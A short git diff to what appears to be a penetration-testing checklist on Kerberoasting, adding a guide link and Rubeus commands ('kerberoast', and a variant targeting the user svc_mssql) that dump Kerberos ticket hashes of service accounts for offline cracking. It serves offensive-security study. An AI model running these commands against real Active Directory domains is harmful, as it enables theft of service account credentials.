@@ -3,9 +3,11 @@
 - [ ] Download and transfer Rubeus on target machine. 
 - [ ] Navigate to the directory Rubeus is in. 
 - [ ] Following will dump the Kerberos hash of any kerberoastable users. 
+- [ ] Good Guide : [By OSCP Mentor](https://github.com/k4sth4/Kerberos)
 
 ```CMD
-Rubeus.exe kerberoast 
+.\Rubeus.exe kerberoast 
+.\Rubeus.exe kerberoast /user:svc_mssql /nowrap
 ```
 
 ![Imgur](https://i.imgur.com/qnRqesT.png)
